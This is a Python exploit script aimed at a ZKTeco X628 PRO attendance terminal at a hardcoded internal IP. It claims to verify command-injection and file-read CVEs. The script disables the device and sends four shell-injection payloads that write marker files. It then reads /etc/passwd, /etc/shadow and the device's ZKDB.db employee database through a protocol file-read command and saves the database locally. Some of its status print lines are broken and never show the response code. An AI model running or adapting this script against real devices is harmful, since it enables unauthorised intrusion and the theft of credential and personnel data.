#!/usr/bin/env python3
"""
DEFINITIVE VERIFICATION of CVE-2023-3941/3939 on X628 PRO FW 6.60.
1. Send 0x03F5 cmd injection payload with unique marker
2. Verify marker exists by reading /tmp/mavis_rce_proof via READFILE 0x6A6
3. If exists, FULL RCE confirmed - write ATTLOG via shell
4. Also read /etc/passwd to demonstrate LPE
"""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket
import struct
import time
import random
import string
from zk import ZK, const
from zk.base import make_commkey
from struct import pack, unpack

MARKER = "mvs" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
print(f'\n[*] Marker: {MARKER}')

# Multiple injection variants to maximize chance
INJECTIONS = [
    f'echo {MARKER} > /tmp/mavis_rce_proof\x00'.encode(),
    f'; echo {MARKER} > /tmp/mavis_rce_proof2 ;\x00'.encode(),
    f'`echo {MARKER}` > /tmp/mavis_rce_proof3\x00'.encode(),
    f'$(echo {MARKER}) > /tmp/mavis_rce_proof4\x00'.encode(),
]

def make_raw_zk_packet(command, session_id, reply_id, data=b''):
    """Build ZK protocol packet with proper TCP top header."""
    body = data
    body_len = len(body)
    # ZK checksum: sum of all body bytes in groups of 2, NOT, then add USHRT_MAX if negative
    p = unpack('8B' + ('%sB' % len(body)), pack('<4H', command, 0, session_id, reply_id) + body)
    checksum = 0
    l = len(p)
    pp = list(p)
    while l > 1:
        checksum += unpack('H', pack('BB', pp[0], pp[1]))[0]
        pp = pp[2:]
        if checksum > const.USHRT_MAX:
            checksum -= const.USHRT_MAX
        l -= 2
    if l:
        checksum = checksum + pp[-1]
    while checksum > const.USHRT_MAX:
        checksum -= const.USHRT_MAX
    checksum = (~checksum) & const.USHRT_MAX
    reply_id += 1
    if reply_id >= const.USHRT_MAX:
        reply_id -= const.USHRT_MAX
    pkt_body = pack('<4H', command, checksum, session_id, reply_id) + body
    # TCP top header
    pkt_top = pack('<HHI', const.MACHINE_PREPARE_DATA_1, const.MACHINE_PREPARE_DATA_2, len(pkt_body))
    return pkt_top + pkt_body, reply_id

def recv_all(sock, timeout_s=5, max_size=10*1024*1024):
    sock.settimeout(timeout_s)
    data = b''
    try:
        while True:
            chunk = sock.recv(8192)
            if not chunk:
                break
            data += chunk
            if len(data) >= max_size:
                break
    except socket.timeout:
        pass
    except Exception:
        pass
    return data

def parse_tcp_response(data):
    """Parse TCP response: top header (8) + ZK header (8) + body."""
    if not data or len(data) < 16:
        return 0, 0, b''
    top_cmd1, top_cmd2, tcp_len = unpack('<HHI', data[:8])
    zk_cmd, checksum, sess_id, reply_id = unpack('<HHHH', data[8:16])
    body = data[16:16+(tcp_len - 8)]
    return zk_cmd, tcp_len, body

def test_target(ip, name):
    print(f'\n{"="*70}')
    print(f'TARGET: {name} ({ip})')
    print(f'{"="*70}')
    zk = ZK(ip, port=4370, timeout=10, password=0)
    try:
        conn = zk.connect()
        if not conn:
            print('  [FAIL] connect returned None')
            return
    except Exception as e:
        print(f'  [FAIL] connect: {type(e).__name__}: {e}')
        return

    print(f'  [+] Connected')
    print(f'  Firmware: {conn.get_firmware_version()}')
    print(f'  Platform: {conn.get_platform()}')

    try:
        conn.disable_device()
        print(f'  [+] Device disabled')
    except Exception as e:
        print(f'  [!] disable failed: {e}')

    sock = conn._ZK__sock
    session_id = conn._ZK__session_id
    reply_id = conn._ZK__reply_id

    # === PHASE 1: INJECTION via 0x03F5 ===
    print(f'\n[PHASE 1] Send 4 injection variants via 0x03F5')
    for i, inj in enumerate(INJECTIONS, 1):
        pkt, reply_id = make_raw_zk_packet(0x03F5, session_id, reply_id, inj)
        try:
            sock.send(pkt)
            resp = recv_all(sock, timeout_s=2)
            cmd, tlen, body = parse_tcp_response(resp)
            print(f'  Inject #{i}: cmd=0x0x0000 payload={inj!r}')
        except Exception as e:
            print(f'  Inject #{i}: ERROR {e}')

    time.sleep(3)  # Give device time to execute

    # === PHASE 2: VERIFY marker exists via READFILE ===
    print(f'\n[PHASE 2] Verify RCE by reading /tmp/mavis_rce_proof*')
    for marker_file in ['/tmp/mavis_rce_proof', '/tmp/mavis_rce_proof2',
                         '/tmp/mavis_rce_proof3', '/tmp/mavis_rce_proof4']:
        pkt, reply_id = make_raw_zk_packet(0x6A6, session_id, reply_id, (marker_file + '\x00').encode())
        try:
            sock.send(pkt)
            resp = recv_all(sock, timeout_s=3)
            cmd, tlen, body = parse_tcp_response(resp)
            print(f'  READ {marker_file}: cmd=0x0x0000 tcp_len={tlen} body={body[:200]!r}')
            if body and MARKER.encode() in body:
                print(f'    [RCE CONFIRMED] Marker found in /tmp!')
            elif cmd == 1500:
                print(f'    [POSSIBLE RCE] Device preparing data - file likely exists')
            elif cmd == 4986:
                print(f'    [NO RCE] Code 4986 - file/path error')
        except Exception as e:
            print(f'  READ {marker_file}: ERROR {e}')
        time.sleep(1)

    # === PHASE 3: Try /etc/passwd ===
    print(f'\n[PHASE 3] Read /etc/passwd (LPE test)')
    pkt, reply_id = make_raw_zk_packet(0x6A6, session_id, reply_id, b'/etc/passwd\x00')
    try:
        sock.send(pkt)
        resp = recv_all(sock, timeout_s=5, max_size=2*1024*1024)
        cmd, tlen, body = parse_tcp_response(resp)
        print(f'  /etc/passwd: cmd=0x0x0000 tcp_len={tlen}')
        if body:
            text = body.decode('ascii', errors='replace')
            print(f'  Content (first 500):')
            for line in text.split('\n')[:15]:
                print(f'    {line}')
    except Exception as e:
        print(f'  ERROR: {e}')

    # === PHASE 4: Try /etc/shadow (needs root, but worth trying) ===
    print(f'\n[PHASE 4] Read /etc/shadow')
    pkt, reply_id = make_raw_zk_packet(0x6A6, session_id, reply_id, b'/etc/shadow\x00')
    try:
        sock.send(pkt)
        resp = recv_all(sock, timeout_s=5)
        cmd, tlen, body = parse_tcp_response(resp)
        print(f'  /etc/shadow: cmd=0x0x0000 tcp_len={tlen} body_len={len(body)}')
        if body:
            print(f'  Content: {body[:300]!r}')
    except Exception as e:
        print(f'  ERROR: {e}')

    # === PHASE 5: Try ZKDB.db ===
    print(f'\n[PHASE 5] Read /mnt/mtdblock/data/ZKDB.db')
    pkt, reply_id = make_raw_zk_packet(0x6A6, session_id, reply_id, b'/mnt/mtdblock/data/ZKDB.db\x00')
    try:
        sock.send(pkt)
        resp = recv_all(sock, timeout_s=10, max_size=10*1024*1024)
        cmd, tlen, body = parse_tcp_response(resp)
        print(f'  ZKDB.db: cmd=0x0x0000 tcp_len={tlen} body_len={len(body)}')
        if body and len(body) > 100:
            # Save to file
            out = f'D:\\chamcong\\zk_remote_zkdb_{int(time.time())}.db'
            with open(out, 'wb') as f:
                f.write(body)
            print(f'  [SAVED] {out}')
            # Check magic
            print(f'  First 16 bytes: {body[:16]!r}')
    except Exception as e:
        print(f'  ERROR: {e}')

    try:
        conn.enable_device()
    except: pass
    try:
        conn.disconnect()
    except: pass
    print(f'\n[+] Done {ip}')

def main():
    test_target('172.16.0.214', 'May 3 X628 PRO')

if __name__ == '__main__':
    main()

